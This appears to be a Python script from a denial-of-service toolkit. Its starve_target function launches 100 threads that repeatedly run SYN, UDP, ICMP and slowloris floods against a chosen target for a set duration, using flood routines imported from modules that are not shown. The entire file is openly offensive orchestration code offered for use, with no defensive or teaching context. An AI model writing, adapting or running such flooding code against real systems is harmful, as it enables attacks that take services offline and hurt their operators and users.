import threading
from core.layer3 import syn_flood, icmp_flood
from core.layer4 import udp_flood
from core.layer7 import slowloris

def starve_target(target, duration):
    stop = threading.Event()
    threads = []
    def run():
        while not stop.is_set():
            syn_flood(target, 80, stop)
            udp_flood(target, 53, stop)
            icmp_flood(target, 0, stop)
            slowloris(target, stop, None, None)
    for _ in range(100):
        t = threading.Thread(target=run)
        t.start()
        threads.append(t)
    import time
    time.sleep(duration)
    stop.set()
    for t in threads:
        t.join()